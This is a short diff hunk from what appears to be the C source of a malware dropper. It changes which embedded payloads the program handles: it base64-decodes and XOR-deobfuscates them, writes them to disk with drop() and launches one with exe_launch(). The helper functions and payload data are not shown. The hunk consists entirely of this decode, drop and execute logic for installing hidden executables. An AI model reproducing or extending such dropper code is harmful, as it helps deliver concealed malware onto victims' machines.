@@ -175,32 +175,32 @@ int main(int argc, char* argv[])
 ////////////////////////////////////////////
 
 #else
-		dropper_start(4);
-		dropper_start(5);
+		dropper_start(1);
+		dropper_start(2);
 //		dropper_start(1);
 
 	#ifdef DROPPER_BASE64 == 1
-		data4 = base64decode(data4, &size4);
-		data5 = base64decode(data5, &size5);
+		data1 = base64decode(data1, &size1);
+		data2 = base64decode(data2, &size2);
 //		data1 = base64decode(data1, &size1);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		data4 = XOR(data4, size4);
-		data5 = XOR(data5, size5);
+		data1 = XOR(data1, size1);
+		data2 = XOR(data2, size2);
 //		data1 = XOR(data1, size1);
 	#endif
 
 
-		printf("%.*s", 40, data4);
-		printf("%.*s", 40, data5);
+		printf("%.*s", 40, data1);
+		printf("%.*s", 40, data2);
 
-		drop(size4, data4, name4);
-		drop(size5, data5, name5);
+		drop(size1, data1, name1);
+		drop(size2, data2, name2);
 //		drop(size1, data1, name1);
 
 //		exe_launch(name1);
-		exe_launch(name4);
+		exe_launch(name1);
 
 #endif
 
